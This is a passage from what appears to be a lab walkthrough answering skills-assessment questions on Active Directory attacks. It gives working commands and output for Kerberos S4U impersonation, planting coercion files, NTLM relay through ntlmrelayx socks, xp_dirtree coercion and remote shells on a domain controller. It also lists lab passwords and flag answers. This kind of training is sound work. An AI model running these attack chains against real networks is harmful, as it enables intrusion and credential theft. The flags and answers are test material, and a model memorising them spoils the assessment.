ESC1$ can now impersonate users on BACKUP01$ via S4U2Proxy

# exit
Bye!
```

Subsequently, students will request a service ticket for `cifs/backup01.inlanefreight.local` service impersonating the Administrator:

Code: shell

```shell
getST.py -spn cifs/backup01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.119.3 'inlanefreight.local/esc1$:E$C1'
```

```
htb-student@LINUX02:~$ getST.py -spn cifs/backup01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.119.3 'inlanefreight.local/esc1$:E$C1'
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Right after the students have successfully attained the `Administrator.ccache` file, they will use `psexec.py` to connect to the `BACKUP01` host and get the flag:

Code: shell

```shell
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass backup01.inlanefreight.local
type C:\Users\Administrator\Desktop\flag.txt
```

```
htb-student@LINUX02:~$ KRB5CCNAME=Administrator.ccache  psexec.py -k -no-pass backup01.inlanefreight.local

Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Requesting shares on backup01.inlanefreight.local.....
[*] Found writable share ADMIN$
[*] Uploading file SRoVdOZd.exe
[*] Opening SVCManager on backup01.inlanefreight.local.....
[*] Creating service xhKw on backup01.inlanefreight.local.....
[*] Starting service xhKw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4720]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
ADCS_Coercing_Authentication
```

Answer: `ADCS_Coercing_Authentication`

# Skills Assessment

## Question 3

### "Submit the password of the SQL user 'sqlftp'."

Using the shell session from the previous question, students will come to know that enumerating the `C:\` directory another directory called `ShareBackups` will be visible:

Code: shell

```shell
dir C:\
```

```
Microsoft Windows [Version 10.0.17763.4720]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32> dir C:\

 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\

07/17/2023  03:37 PM    <DIR>          Inveigh-net4.6.2-v2.0.10
02/25/2022  11:20 AM    <DIR>          PerfLogs
08/05/2023  04:48 AM    <DIR>          Program Files
07/12/2023  03:57 PM    <DIR>          Program Files (x86)
08/21/2023  04:37 AM    <DIR>          ShareBackups
08/17/2023  01:59 AM    <DIR>          Users
07/03/2024  05:56 AM    <DIR>          Windows
               0 File(s)              0 bytes
               7 Dir(s)  18,776,793,088 bytes free
```

Students need to change their current working directory to `C:\ShareBackups`. While enumerating further the directories in `ShareBackups`, students will discover a `sqlftp test.txt` note in the `Database` directory, providing an information that the potential share (directory) is being worked on and frequently accessed.

Code: shell

```shell
cd C:\ShareBackups
dir Database
type "Database\sqlftp test.txt"
```

```
C:\Windows\system32> cd C:\ShareBackups
C:\ShareBackups> dir Database

 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\ShareBackups\Database

08/21/2023  04:38 AM    <DIR>          .
08/21/2023  04:38 AM    <DIR>          ..
08/21/2023  04:39 AM                99 sqlftp test.txt
               1 File(s)             99 bytes
               2 Dir(s)  18,776,694,784 bytes free

C:\ShareBackups> type "Database\sqlftp test.txt"
This is a test file, please dont delete. 

I'll be working on this shared for a few weeks.

Dob
```

Having this as information, students need to utilize `ntlm_theft` located in `tools/ntlm_theft` to create a malicious `.lnk` file that will be placed there, using the `-g` option to generate different (all) extensions that can be used to trigger a coerced authentication, the `-s` to specify the IP address of the listener host, and the `-f` to specify the filename.

Code: shell

```shell
cd tools/ntlm_theft
python3 ntlm_theft.py -g all -s 172.16.119.20 -f importantt 
```

```
htb-student@LINUX02:~$ cd tools/ntlm_theft
htb-student@LINUX02:~/tools/ntlm_theft$ python3 ntlm_theft.py -g all -s 172.16.119.20 -f importantt 

Created: importantt/importantt.scf (BROWSE TO FOLDER) 
Created: importantt/importantt-(url).url (BROWSE TO FOLDER) 
Created: importantt/importantt-(icon).url (BROWSE TO FOLDER) 
<SNIP>
```

Right after they have executed the above command, students will have to visit the sub-directory that was automatically created in the current working directory of `ntlm_theft` and start a `smbserver` used to transfer the `.lnk` file to the `BACKUP01` host.

Code: shell

```shell
cd importantt/
sudo smbserver.py share . -smb2support
```

```
htb-student@LINUX02:~/tools/ntlm_theft$ cd importantt/
htb-student@LINUX02:~/tools/ntlm_theft/importantt$ sudo smbserver.py share . -smb2support

[sudo] password for htb-student: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Back in the `BACKUP01` shell session, students need to utilize the `copy` command to transfer the `importantt.lnk` file. Once transferred, students can terminate the `smbserver.py` that they have started.

Code: shell

```shell
copy \\172.16.119.20\share\importantt.lnk C:\ShareBackups\Database
```

```
C:\ShareBackups> copy \\172.16.119.20\share\importantt.lnk C:\ShareBackups\Database
        1 file(s) copied.
```

Subsequently, students need to start `ntlmrelayx` with `sudo` while enabling the `-socks` option to capture the relayed (coerced) authentication request, targeting the `smb` protocol on the `SQL01` host (`172.16.119.80`):

Code: shell

```shell
sudo ntlmrelayx.py -t smb://172.16.119.80 -smb2 -socks
```

```
htb-student@LINUX02:~$ sudo ntlmrelayx.py -t smb://172.16.119.80 -smb2 -socks
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
<SNIP>
```

After a while, they will come to know that an authentication from the user `INLANEFREIGHT/DOB` succeeded.

Code: shell

```shell
socks
```

```
htb-student@LINUX02:~$ sudo ntlmrelayx.py -t smb://172.16.119.80 -smb2 -socks
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
<SNIP>
[*] SMBD-Thread-10: Received connection from 172.16.119.3, attacking target [smb://172.16.119.80](smb://172.16.119.80)
[*] Authenticating against [smb://172.16.119.80](smb://172.16.119.80) as INLANEFREIGHT/DOB SUCCEED
ntlmrelayx> socks
Protocol  Target         Username           AdminStatus  Port 
--------  -------------  -----------------  -----------  ----
SMB       172.16.119.80  INLANEFREIGHT/DOB  FALSE        445
```

Subsequently, students will have to utilize `proxychains` and `smbclient.py` from another terminal window to access the resources SMB resources on `172.16.119.80` host. Also, they will come to know that there is a share called `ShareSQL` containing a `ShareSQL.zip` ZIP file, which students need to download locally.

Code: shell

```shell
proxychains4 smbclient.py INLANEFREIGHT/DOB@172.16.119.80 -no-pass
shares
use ShareSQL
ls
get ShareSQL.zip
```

```
htb-student@LINUX02:~$ proxychains4 smbclient.py INLANEFREIGHT/DOB@172.16.119.80 -no-pass

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.80:445  ...  OK
Type help for list of commands
# shares
ADMIN$
C$
IPC$
ShareSQL

# use ShareSQL
# ls
drw-rw-rw-          0  Mon Aug 21 20:25:48 2023 .
drw-rw-rw-          0  Mon Aug 21 20:25:48 2023 ..
-rw-rw-rw-        242  Mon Aug 21 20:25:48 2023 sample.sql
-rw-rw-rw-       2304  Mon Aug 21 20:25:48 2023 ShareSQL.zip

# get ShareSQL.zip
```

Once they have successfully downloaded the ZIP file, students can terminate the `smbserver.py` connection.

Right after students have terminated the `smbserver` connection, they will have to inspect the `logs/` directory of `Responder` to come to know that the tool has captured `FTP-Clear-Text` credentials.

Code: shell

```shell
cat tools/Responder/logs/FTP-Cleartext-ClearText-172.16.119.80.txt 
```

```
htb-student@LINUX02:~$ cat tools/Responder/logs/FTP-Cleartext-ClearText-172.16.119.80.txt 

b'sql_ftp_test':b'SQLUniqueCr3ndt1als$013!'
b'sql_ftp_test':b'SQLUniqueCr3ndt1als$013!'
b'sql_ftp_test':b'SQLUniqueCr3ndt1als$013!'
b'sql_ftp_test':b'SQLUniqueCr3ndt1als$013!'
b'sql_ftp_test':b'SQLUniqueCr3ndt1als$013!'
<SNIP>
```

The captured cleartext credentials (password), will be used by the students to unzip the previously downloaded ZIP file (`ShareSQL.zip`).

Code: shell

```shell
7z x ShareSQL.zip -p'SQLUniqueCr3ndt1als$013!'
```

```
htb-student@LINUX02:~$ 7z x ShareSQL.zip -p'SQLUniqueCr3ndt1als$013!'

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7302P 16-Core Processor                (830F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 2304 bytes (3 KiB)

Extracting archive: ShareSQL.zip
--
Path = ShareSQL.zip
Type = zip
Physical Size = 2304

Everything is Ok

Files: 6
Size:       1789
Compressed: 2304
```

Once students have unzipped successfully the archive, they will come to know that there is a `connect.sql` file containing credentials such as `username` (of the sqlftp user) and a `password`.

Code: shell

```shell
ls
cat connect.sql
```

```
htb-student@LINUX02:~$ ls
Administrator.ccache  backup01.pfx  connect.sql   Desktop    Downloads  <SNIP>

htb-student@LINUX02:~$ cat connect.sql 

-- Authenticate user using provided credentials
DECLARE @Username VARCHAR(50) = 'sqlftp';
DECLARE @Password VARCHAR(50) = 'Here1S@notherPassword!';
<SNIP>
```

Answer: `Here1S@notherPassword!`

# Skills Assessment

## Question 4

### "Compromise DC01 and submit the flag located at 'C:\\Users\\Administrator\\Desktop\\flag.txt'"

Using the previously discovered SQL credentials, students will have to use `mssqlclient.py` to authenticate to the `SQL01` (`172.16.119.80`) host.

Code: shell

```shell
mssqlclient.py sqlftp:'Here1S@notherPassword!'@172.16.119.80
```

```
htb-student@LINUX02:~$ mssqlclient.py sqlftp:'Here1S@notherPassword!'@172.16.119.80
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

<SNIP> 
[!] Press help for extra shell commands
SQL (sqlftp  guest@master)>
```

They will come to know that by having an `MSSQL` session, students are able to coerce an authentication to themselves. Students need to start `ntlmrelayx` in another terminal window (SSH session), targeting the `smb` protocol on the domain controller (`172.16.119.3`) and specifying `-socks` to capture and reuse the request later.

Code: shell

```shell
sudo ntlmrelayx.py -t smb://172.16.119.3 -smb2 -socks
```

```
htb-student@LINUX02:~$ sudo ntlmrelayx.py -t smb://172.16.119.3 -smb2 -socks

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
<SNIP>
```

Right, after they have started `ntlmrelayx`, students need to use the `mssqclient.py` session to use `xp_dirtree` to coerce an authentication to themselves.

Code: shell

```shell
EXEC xp_dirtree '//172.16.119.20/test.txt'
```

```
SQL (sqlftp  guest@master)> EXEC xp_dirtree '//172.16.119.20/test.txt'
subdirectory   depth   
------------   -----
```

Students will come to know that in the `ntlmrelayx` a session as `SQLADM` has successfully been established.

Code: shell

```shell
socks
```

```
htb-student@LINUX02:~$ sudo ntlmrelayx.py -t smb://172.16.119.3 -smb2 -socks

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
<SNIP>
[*] SMBD-Thread-42: Received connection from 172.16.119.80, attacking target [smb://172.16.119.3](smb://172.16.119.3) [*] Authenticating against [smb://172.16.119.3](smb://172.16.119.3) as INLANEFREIGHT/SQLADM SUCCEED ntlmrelayx> socks 
Protocol Target Username AdminStatus Port 
-------- ------------ -------------------- ----------- ---- 
SMB 172.16.119.3 INLANEFREIGHT/SQLADM TRUE 445
```

They will have to utilize `proxychains4` and `smbexec.py` in another terminal window (SSH session) to establish an interactive shell session on the domain controller (`172.16.119.3`) as the `SQLADM` user and get the flag.

```shell
proxychains4 smbexec.py INLANEFREIGHT/SQLADM@172.16.119.3 -no-pass
type C:\Users\Administrator\Desktop\flag.txt
```
```
htb-student@LINUX02:~$ proxychains4 smbexec.py INLANEFREIGHT/SQLADM@172.16.119.3 -no-pass

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.3:445  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt

Pwn_DC_Made_3@Sy_With0uT_S1gning
```

Answer: `Pwn_DC_Made_3@Sy_With0uT_S1gning`